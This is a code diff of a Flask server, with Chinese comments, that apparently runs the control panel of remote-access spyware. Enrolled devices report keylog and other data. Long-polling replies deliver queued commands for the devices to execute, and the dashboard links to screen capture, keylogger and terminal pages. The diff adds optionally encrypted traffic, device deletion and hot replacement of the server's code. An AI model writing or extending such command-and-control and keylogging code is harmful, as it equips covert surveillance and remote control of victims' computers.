@@ -13,23 +13,36 @@ def api_ping(mac):
 
 @bp.route('/report', methods=['GET'])
 def report_client():
-    mac = decrypt_data(request.args.get('mac', ''))
-    ver = decrypt_data(request.args.get('ver', ''))
-    fg = decrypt_data(request.args.get('fg', ''))
-    kl = decrypt_data(request.args.get('kl', ''))
+    mac_raw = request.args.get('mac', '')
+    ver_raw = request.args.get('ver', '')
+    fg_raw = request.args.get('fg', '')
+    kl_raw = request.args.get('kl', '')
+
+    mac = decrypt_data(mac_raw)
+    ver = decrypt_data(ver_raw)
+    fg = decrypt_data(fg_raw)
+    kl = decrypt_data(kl_raw)
+
+    # 如果原始传入的mac经过解密后发生了变化（说明本身是Hex加密的），则标记该设备支持加密通信
+    is_encrypted = (mac != mac_raw and mac_raw != "")
+
     if mac and ver:
         time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         if mac not in clients_db:
-            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str, "fg": fg, "kl": kl}
+            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str, "fg": fg, "kl": kl, "encrypted": is_encrypted}
         else:
             clients_db[mac]["ver"] = ver
             clients_db[mac]["last_seen"] = time_str
             clients_db[mac]["fg"] = fg
             clients_db[mac]["kl"] = kl
+            clients_db[mac]["encrypted"] = is_encrypted
             if "name" not in clients_db[mac]:
                 clients_db[mac]["name"] = "未命名设备"
 
         save_db()
+
+        def make_response(payload):
+            return encrypt_data(payload) if clients_db[mac].get("encrypted") else payload
 
         # 长轮询机制：挂起等待最多15秒，高频率检测降低响应延迟到100ms
         for i in range(150):
@@ -37,14 +50,14 @@ def report_client():
             if pending_file_cmd:
                 clients_db[mac]['pending_file_cmd'] = ''
                 save_db()
-                return encrypt_data(pending_file_cmd), 200
+                return make_response(pending_file_cmd), 200
 
             # 如果有缓存的待执行命令，通过心跳返回让客户端去执行
             pending_cmd = clients_db[mac].get('pending_cmd', '')
             if pending_cmd:
                 clients_db[mac]['pending_cmd'] = '' # 下发后清空，只下发一次
                 save_db()
-                return encrypt_data(pending_cmd), 200
+                return make_response(pending_cmd), 200
 
             if i % 10 == 0:
                 clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -55,7 +68,7 @@ def report_client():
         # 循环结束前刷新最后心跳时间
         clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         save_db()
-        return encrypt_data("SSID:" + clients_db[mac].get('name', '未命名设备')), 200
+        return make_response("SSID:" + clients_db[mac].get('name', '未命名设备')), 200
 
     return "Missing parameters", 400
 
@@ -67,6 +80,16 @@ def api_rename():
     new_name = data.get('name')
     if mac in clients_db:
         clients_db[mac]['name'] = new_name
+        save_db()
+    return jsonify({"status": "ok"})
+
+@bp.route('/api/delete', methods=['POST'])
+def api_delete():
+    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
+    data = request.json
+    mac = data.get('mac')
+    if mac in clients_db:
+        del clients_db[mac]
         save_db()
     return jsonify({"status": "ok"})
 
@@ -171,10 +194,16 @@ def delete_version():
 @bp.route('/update_server', methods=['POST'])
 def update_server():
     if not session.get('logged_in'): return redirect(url_for('auth.login'))
-    uploaded_app = request.files.get('app_file')
+    uploaded_files = request.files.getlist('app_file')
 
-    if uploaded_app and uploaded_app.filename != '':
-        uploaded_app.save(os.path.join(UPDATE_DIR, uploaded_app.filename))
+    files_saved = False
+    server_dir = os.path.dirname(os.path.abspath(__file__))
+    for uploaded_app in uploaded_files:
+        if uploaded_app and uploaded_app.filename != '' and uploaded_app.filename.endswith('.py'):
+            uploaded_app.save(os.path.join(server_dir, os.path.basename(uploaded_app.filename)))
+            files_saved = True
+
+    if files_saved:
         import threading
         import sys
         import time
@@ -239,6 +268,7 @@ def tables_partial():
                     <a href="/screen/{{ mac }}" style="background:#fd7e14; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📺 屏幕画面</a>
                     <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🔤 键盘记录</a>
                     <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📜 运行日志</a>
+                    <a href="/entertainment/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🎵 娱乐控制</a>
                 </td>
                 <td class="status-online">📡 在线</td>
             </tr>
@@ -280,6 +310,7 @@ def tables_partial():
                 <td style="color:#777;">v{{ info.ver }}</td>
                 <td style="color:#777;">{{ info.last_seen }}</td>
                 <td>
+                    <button onclick="deleteClient('{{ mac }}')" style="background:#dc3545; color:#fff; padding:5px 10px; border:none; border-radius:4px; font-size:14px; cursor:pointer; margin-right:5px;">🗑️ 删除</button>
                     <a href="/terminal/{{ mac }}" style="background:#6c757d; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block;">📝 查看遗留日志</a>
                     <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">📜 运行日志</a>
                     <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">🔤 键盘记录</a>
@@ -381,7 +412,7 @@ def index():
                 <h3 style="margin-top:0;">⚙️ 热更新服务端代码</h3>
                 <form action="/update_server" method="post" enctype="multipart/form-data">
                     <label>支持热更新服务端所有 .py 文件 (如 app.py, core.py, bp_main.py等)，同名覆盖完毕后将自动重启服务端。</label><br>
-                    <input type="file" name="app_file" accept=".py" style="margin: 10px 0;">
+                    <input type="file" name="app_file" accept=".py" multiple style="margin: 10px 0;">
                     <br>
                     <button type="submit" style="background:#17a2b8; padding: 10px 20px; margin-top:5px;">更新并重启服务端</button>
                 </form>
@@ -467,6 +498,18 @@ def index():
                         fetchTables(); // 直接刷新列表看到新名称
                     });
                 }
+            };
+
+            window.deleteClient = function(mac) {
+                if(!confirm("确定要删除该离线设备的记录吗？")) return;
+                fetch('/api/delete', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({mac: mac})
+                }).then(() => {
+                    alert("设备记录已删除");
+                    fetchTables();
+                });
             };
 
             window.showMainContextMenu = function(e) {
